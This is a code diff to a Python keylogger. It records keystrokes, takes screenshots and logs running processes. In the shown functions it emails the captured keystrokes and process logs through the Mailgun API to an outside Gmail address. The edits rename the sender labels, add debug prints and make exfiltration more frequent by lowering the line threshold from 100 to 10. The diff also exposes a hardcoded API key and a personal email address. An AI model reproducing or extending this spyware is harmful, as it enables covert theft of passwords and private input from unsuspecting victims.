@@ -48,7 +48,7 @@ def send_simple_message(file_content):
     return requests.post(
         "https://api.mailgun.net/v3/mg.ladmail.com/messages",
         auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
-        data={"from": "PYKEYLOGGER <postmaster@mg.ladmail.com>",
+        data={"from": "HookerFromLaptop_1 <postmaster@mg.ladmail.com>",
               "to": "lad <hth225@gmail.com>",
               "subject": "Hello lad, Here is Keylogging result",
               "text":  file_content
@@ -59,7 +59,7 @@ def send_LOG():
         "https://api.mailgun.net/v3/mg.ladmail.com/messages",
         auth=("api", "key-a65a55fe6f78da49a3addfd94fa83b87"),
         files=[("attachment", open("Process_list.txt"))],
-        data={"from": "PSLOGFILEMANAGER <postmaster@mg.ladmail.com>",
+        data={"from": "PSManagerFromLaptop_1 <postmaster@mg.ladmail.com>",
               "to": "lad <hth225@gmail.com>",
               "subject": "Hello lad, Here is captured Process Logfile",
               "text": "CAPTURED PROCESS LOGFILE you should view on google docs"
@@ -72,8 +72,9 @@ def parse_process_list():
     file.write(str(proc))
     file.close()
 
-if __name__ == "__main__":
 
+if __name__ == "__main__":
+     print('start')
      while 1:
          status = time.localtime()
          recorded = keyboard.record(until='enter')
@@ -87,9 +88,11 @@ if __name__ == "__main__":
 
          screenShot()
          with open('LOG.txt') as f:
+             # len(f.readlines())
              count = (sum(1 for _ in f))
+             print ('count:', count)
 
-         if (count >= 100):
+         if (count >= 10):
             parse_process_list()
             send_simple_message(file_content)
             send_LOG()
